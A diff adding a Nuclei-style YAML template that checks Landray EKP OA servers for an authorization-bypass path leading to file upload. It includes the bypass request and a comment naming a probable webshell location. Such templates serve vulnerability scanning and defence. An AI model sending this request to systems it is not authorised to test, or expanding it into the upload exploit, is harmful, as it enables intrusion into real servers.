@@ -1,0 +1,25 @@
+id: lanlingOA-EKP-file-upload
+
+info:
+  name: 蓝凌EKP前台授权绕过导致文件上传
+  author: cnaq
+  severity: high
+  description: 蓝凌EKP前台授权绕过导致文件上传
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8CEKP%E5%89%8D%E5%8F%B0%E6%8E%88%E6%9D%83%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  tags: lanlingOA,code,exec
+  
+requests:
+  - raw:
+      - |
+        GET /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+# /resource/ui-ext/ZzzZ/jmdyy.jsp
+# 复现过程查看reference
